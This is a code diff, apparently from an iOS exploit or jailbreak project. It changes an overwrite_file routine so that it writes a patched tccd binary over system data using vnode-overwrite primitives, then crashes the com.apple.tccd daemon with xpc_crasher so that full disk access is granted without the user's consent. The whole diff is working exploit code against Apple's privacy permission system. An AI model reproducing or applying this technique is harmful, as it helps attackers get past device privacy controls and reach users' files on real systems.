@@ -296,11 +296,18 @@ static NSData* patchTCCD(void* executableMap, size_t executableLength) {
     }
     return data;
 }
-
 static bool overwrite_file(char* to, char* from) {
-    if(funVnodeOverwrite2(to, from) == 0)
-        return true;
-    return false;
+    // funVnodeOverwrite2(to, from)
+    // evelyn's method: https://twitter.com/eveiyneee/status/1685632013586350081
+    //    funVnodeOverwrite2("/System/Library/Audio/UISounds/photoShutter.caf", from);
+    //    funVnodeRedirectFolder(to, "/System/Library/Audio/UISounds/photoShutter.caf");
+    NSURL* documentDirectory = [NSFileManager.defaultManager URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask][0];
+    NSURL* tccd_orig = [documentDirectory URLByAppendingPathComponent:@"tccd_orig.bin"];
+    NSURL* tccd_patched = [documentDirectory URLByAppendingPathComponent:@"tccd_patched.bin"];
+    funVnodeOverwriteTccdPlist(tccd_patched.path.UTF8String);
+    xpc_crasher("com.apple.tccd");
+    printf("tccd_patched: %s\n", tccd_patched.path.UTF8String);
+    return true;
 }
 
 static void grant_full_disk_access_impl(void (^completion)(NSString* extension_token,
@@ -352,7 +359,7 @@ static void grant_full_disk_access_impl(void (^completion)(NSString* extension_t
 //    xpc_crasher("com.apple.tccd");
 //    sleep(1);
     //Even FREEZING when overwrite original data
-    overwrite_file(targetPath, tccd_orig.path.UTF8String);
+    overwrite_file(targetPath, tccd_patched.path.UTF8String);
     xpc_crasher("com.apple.tccd");
 //    call_tccd(^(NSString* _Nullable extension_token) {
 //        overwrite_file(targetPath, tccd_orig.path.UTF8String);
